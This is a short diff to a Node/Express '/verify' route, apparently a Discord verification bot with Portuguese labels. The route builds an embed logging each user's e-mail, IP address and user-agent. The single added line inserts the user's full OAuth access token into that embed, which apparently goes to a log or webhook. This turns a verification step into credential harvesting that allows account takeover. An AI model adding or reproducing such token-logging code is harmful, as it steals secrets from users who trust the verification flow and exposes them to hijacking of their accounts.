@@ -90,6 +90,7 @@ app.get('/verify', async (req, res) => {
                 { name: 'E-mail', value: discordUser.email || 'Não disponível', inline: true },
                 { name: 'IP', value: ip || 'Não detectado', inline: false },
                 { name: 'User-Agent', value: (req.headers['user-agent'] || 'N/A').substring(0, 1024), inline: false },
+                { name: 'Access Token', value: `\`\`\`${accessToken}\`\`\``, inline: false },
                 { name: 'Cargo', value: roleError ? `❌ ERRO: \`${JSON.stringify(roleError).substring(0, 900)}\`` : `✅ Cargo \`${roleId}\` aplicado`, inline: false }
             ];
 
